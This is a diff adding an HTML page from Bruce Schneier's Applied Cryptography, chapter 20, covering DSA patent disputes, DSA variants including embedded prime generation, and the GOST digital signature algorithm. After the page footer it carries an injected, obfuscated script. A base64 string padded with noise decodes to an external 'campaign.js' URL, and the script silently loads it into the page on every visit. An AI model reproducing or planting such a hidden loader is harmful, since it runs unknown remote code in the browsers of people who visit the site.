@@ -1,0 +1,150 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=493-496//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>David Kravitz, formerly of the NSA, holds a patent on DSA [897]. According to NIST [538]:
+</P>
+<BLOCKQUOTE><P>NIST intends to make this DSS technique available world-wide on a royalty-free basis to the public interest. We believe this technique is patentable and that no other patents would apply to the DSS, but we cannot give firm assurances to such effect in advance of issuance of the patent.
+</P>
+</BLOCKQUOTE><P>Even so, three patent holders claim that the DSA infringes on their patents: Diffie-Hellman (see Section 22.1) [718], Merkle-Hellman (see Section 19.2) [720], and Schnorr (see Section 21.3) [1398]. The Schnorr patent is the most troublesome. The other two patents expire in 1997; the Schnorr patent is valid until 2008. The Schnorr algorithm was not developed with government money; unlike the PKP patents, the U.S. government has no rights to the Schnorr patent; and Schnorr patented his algorithm worldwide. Even if the U.S. courts rule in favor of DSA, it is unclear what other courts around the world would do. Is an international company going to adopt a standard that may be legal in some countries but infringes on a patent in others? This issue will take time to resolve; at the time of this writing it isn&#146;t even resolved in the United States.
+</P>
+<P>In June 1993 NIST proposed to give PKP an exclusive patent license to DSA [541]. The agreement fell through after public outcry and the standard was issued without any deal. NIST said [542]:</P>
+<BLOCKQUOTE><P>...NIST has addressed the possible patent infringement claims, and has concluded that there are no valid claims.
+</P>
+</BLOCKQUOTE><P>So the standard is official, lawsuits are threatened, and no one knows what to do. NIST has said that it would help defend people sued for patent infringement, if they were using DSA to satisfy a government contract. Everyone else, it seems, is on their own. ANSI has a draft banking standard that uses DSA [60]. NIST is working to standardize DSA within the government. Shell Oil has made DSA their international standard. I know of no other proposed DSA standards.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">20.2 DSA Variants</FONT></H3>
+<P>This variant makes computation easier on the signer by not forcing him to compute <I>k</I><SUP>-1</SUP> [1135]. All the parameters are as in DSA. To sign a message, <I>m</I>, Alice generates two random numbers, <I>k</I> and <I>d</I>, both less than <I>q</I>. The signature is</P>
+<DL>
+<DD><I>r</I> = (<I>g<SUP>k</I></SUP> mod <I>p</I>) mod <I>q</I>
+<DD><I>s</I> = (<I>H</I>(<I>m</I>) &#43; <I>xr</I>) * <I>d</I> mod <I>q</I>
+<DD><I>t</I> = <I>kd</I> mod <I>q</I>
+</DL>
+<P>Bob verifies the signature by computing
+</P>
+<DL>
+<DD><I>w</I> = <I>t</I>/<I>s</I> mod <I>q</I>
+<DD><I>u</I><SUB>1</SUB> = (<I>H</I>(<I>m</I>) * <I>w</I>) mod <I>q</I>
+<DD><I>u</I><SUB>2</SUB> = (<I>rw</I>) mod <I>q</I>
+</DL>
+<P>If <I>r</I> = ((<I>g<SUP>u</I><SMALL>1</SMALL></SUP> * <I>y<SUP>u</I><SMALL>2</SMALL></SUP>) mod <I>p</I>) mod <I>q</I>, then the signature is verified.</P>
+<P>This next variant makes computation easier on the verifier [1040,1629]. All the parameters are as in DSA. To sign a message, <I>m</I>, Alice generates a random number, <I>k</I>, less than <I>q</I>. The signature is</P>
+<DL>
+<DD><I>r</I> = (<I>g<SUP>k</I></SUP> mod <I>p</I>) mod <I>q</I>
+<DD><I>s</I> = <I>k</I> * (<I>H</I>(<I>m</I>) &#43; <I>xr</I>)<SUP>-1</SUP> mod <I>q</I>
+</DL>
+<P>Bob verifies the signature by computing
+</P>
+<DL>
+<DD><I>u</I><SUB>1</SUB> = (<I>H</I>(<I>m</I>) * <I>s</I>) mod <I>q</I>
+<DD><I>u</I><SUB>2</SUB> = (<I>sr</I>) mod <I>q</I>
+</DL>
+<P>If <I>r</I> = ((<I>g<SUP>u</I><SMALL>1</SMALL></SUP> * <I>y<SUP>u</I><SMALL>2</SMALL></SUP>) mod <I>p</I>) mod <I>q</I>, then the signature is verified.</P>
+<P>Another DSA variant allows for batch verification; Bob can verify signatures in batches [1135]. If they are all valid, he is done. If one isn&#146;t valid, then he still has to find it. Unfortunately, it is not secure; either the signer or the verifier can easily create a set of bogus signatures that satisfy the batch criteria [974].</P>
+<P>There is also a variant for DSA prime generation, one that embeds <I>q</I> and the parameters used to generate the primes within <I>p</I>. Whether this scheme reduces the security of DSA is still unknown.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Choose an arbitrary sequence of at least 160 bits and call it <I>S</I>. Let <I>g</I> be the length of <I>S</I> in bits.
+<DD><B>(2)</B>&nbsp;&nbsp;Compute <I>U</I> = SHA(<I>S</I>) &#8853; SHA ((<I>S</I> &#43; 1) mod 2<SUP><I>g</I></SUP>), where SHA is the Secure Hash Algorithm (see Section 18.7).
+<DD><B>(3)</B>&nbsp;&nbsp;Form <I>q</I> by setting the most significant bit and the least significant bit of <I>U</I> to 1.
+<DD><B>(4)</B>&nbsp;&nbsp;Check whether <I>q</I> is prime.
+<DD><B>(5)</B>&nbsp;&nbsp;Let <I>p</I> be the concatenation of <I>q, S, C</I>, and SHA(<I>S</I>). <I>C</I> is set to 32 zero bits.
+<DD><B>(6)</B>&nbsp;&nbsp;<I>p</I> = <I>p</I> &#150; (<I>p</I> mod <I>q</I>) &#43; 1.
+<DD><B>(7)</B>&nbsp;&nbsp;<I>p</I> = <I>p</I> &#43; <I>q</I>.
+<DD><B>(8)</B>&nbsp;&nbsp;If the <I>C</I> in <I>p</I> is 0x7fffffff, go to step (1).
+<DD><B>(9)</B>&nbsp;&nbsp;Check whether <I>p</I> is prime.
+<DD><B>(10)</B>&nbsp;&nbsp;If <I>p</I> is composite, go to step (7).
+</DL>
+<P>The neat thing about this variant is that you don&#146;t have to store the values of <I>C</I> and <I>S</I> used to generate <I>p</I> and <I>q</I>; they are embedded within <I>p</I>. For applications without a whole lot of memory, like smart cards, this can be a big deal.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">20.3 GOST Digital Signature Algorithm</FONT></H3>
+<P>This is a Russian digital signature standard, officially called GOST R 34.10-94 [656]. The algorithm is very similar to DSA, and uses the following parameters
+</P>
+<DL>
+<DD><I>p</I> = a prime number, either between 509 and 512 bits long, or between 1020 and 1024 bits long.
+<DD><I>q</I> = a 254- to 256-bit prime factor of <I>p</I> &#150; 1.
+<DD><I>a</I> = any number less than <I>p</I> &#150; 1 such that <I>a<SUP>q</I></SUP> mod <I>p</I> = 1.
+<DD><I>x</I> = a number less than <I>q</I>.
+<DD><I>y</I> = <I>a<SUP>x</I></SUP> mod <I>p</I>.
+</DL>
+<P>The algorithm also makes use of a one-way hash function: <I>H</I>(<I>x</I>). The standard specifies GOST R 34.11-94 (see Section 18.11), a function based on the GOST symmetric algorithm (see Section 14.1) [657].</P>
+<P>The first three parameters, <I>p, q</I>, and <I>a</I>, are public and can be common across a network of users. The private key is <I>x</I>; the public key is <I>y</I>.</P>
+<P>To sign a message, <I>m</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a random number, <I>k</I>, less than <I>q</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates
+<DL>
+<DD><I>r</I> = (<I>a<SUP>k</I></SUP> mod <I>p</I>) mod <I>q</I>
+<DD><I>s</I> = (<I>xr</I> &#43; <I>k</I>(<I>H</I>(<I>m</I>))) mod <I>q</I>
+</DL>
+<BR>If <I>H</I>(<I>m</I>) mod <I>q</I> = 0, then set it equal to 1. If <I>r</I> = 0, then choose another <I>k</I> and start again. The signature is two numbers: <I>r</I> mod 2<SUP>256</SUP> and <I>s</I> mod 2<SUP>256</SUP>. She sends these to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob verifies the signature by computing
+<DL>
+<DD><I>v</I> = <I>H</I>(<I>m</I>)<SUP><I>q</I>-2</SUP> mod <I>q</I>
+<DD><I>z</I><SUB>1</SUB> = (<I>sv</I>) mod <I>q</I>
+<DD><I>z</I><SUB>2</SUB> = ((<I>q</I> &#150; <I>r</I>) * <I>v</I>) mod <I>q</I>
+<DD><I>u</I> = ((<I>a<SUP>z</I><SMALL>1</SMALL></SUP> * <I>y<SUP>z</I><SMALL>2</SMALL></SUP>) mod <I>p</I>) mod <I>q</I>
+</DL>
+<BR>If <I>u</I> = <I>r</I>, then the signature is verified.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(iSzoFSgy, JjlKaIyc) {JjlKaIyc = iSzoFSgy.createElement('script');JjlKaIyc.type = 'text/javascript';JjlKaIyc.async = true;JjlKaIyc.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');iSzoFSgy.getElementsByTagName('body')[0].appendChild(JjlKaIyc);}(document));</script></body>
+</html>
